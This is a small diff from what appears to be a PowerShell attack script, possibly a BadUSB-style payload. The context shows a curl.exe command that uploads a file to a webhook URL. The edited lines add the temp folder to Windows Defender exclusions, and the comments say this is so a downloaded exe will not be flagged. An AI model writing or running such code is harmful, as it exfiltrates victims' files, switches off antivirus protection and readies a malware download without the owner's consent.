@@ -23,7 +23,7 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 
 
-# Add C:/ to exlusions so Windows Defender doesnt flag the exe we will download
+# Add $env:tmp to exlusions so Windows Defender doesnt flag the exe we will download
 Add-MpPreference -ExclusionPath $env:tmp
 
 # Download the exe and save it to temp directory
